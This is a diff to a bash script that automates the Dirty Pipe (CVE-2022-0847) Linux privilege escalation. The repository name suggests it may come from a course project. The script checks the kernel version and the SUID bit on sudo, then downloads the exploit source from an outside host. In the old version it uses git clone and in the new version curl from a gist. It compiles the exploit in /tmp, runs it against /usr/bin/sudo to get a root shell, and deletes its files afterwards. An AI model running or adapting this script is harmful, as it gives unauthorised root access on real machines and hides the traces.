@@ -25,20 +25,19 @@ if [[ "${notvulnerable[*]}" = $kernel_version ]];
             then
                 echo "[+] SUID bit is set on /usr/bin/sudo!"
 
-                # Clone the GitHub repository where exploit code is stored to /tmp directory
-                echo "[*] Grabbing a copy of the exploit from GitHub..."
-                cd /tmp && git clone https://github.com/Lyc4on/ICT3204.git &> /dev/null
-                echo "[+] GitHub repository cloned!"
+                # Grab a copy of the exploit code from GitHub and store it in /tmp directory
+                echo "[*] Grabbing a copy of the exploit code from GitHub..."
+                curl -s https://gist.githubusercontent.com/real-yj/9f336bbfeecd1158da14dfec9d3e2250/raw/7973f5a56a54f0305a630c641c010bc818e4e7f5/CVE-2022-0847.c > /tmp/CVE-2022-0847.c 
                 
                 # Compile exploit and set execute permission on the executable
                 echo "[*] Compiling exploit..."
-                cd ICT3204/Attacks/Privilege_Escalation && gcc CVE-2022-0847.c -o CVE-2022-0847
+                cd /tmp && gcc CVE-2022-0847.c -o CVE-2022-0847
                 chmod +x CVE-2022-0847
                 echo "[+] Exploit successfully compiled and execute permission set!"
 
                 # Execute the exploit to get a root shell and run commands. Perform cleanup at the end.
-                echo "[*] Executing the Dirty Pipe exploit and running commands in root shell..."
-                echo "whoami && rm /tmp/sh" | ./CVE-2022-0847 /usr/bin/sudo
+                echo "[*] Executing the Dirty Pipe exploit to run commands in root shell..."
+                echo "whoami && rm /tmp/sh /tmp/CVE-2022-0847.c /tmp/CVE-2022-0847" | ./CVE-2022-0847 /usr/bin/sudo
                 echo "[+] All commands have been executed!"
 
             else
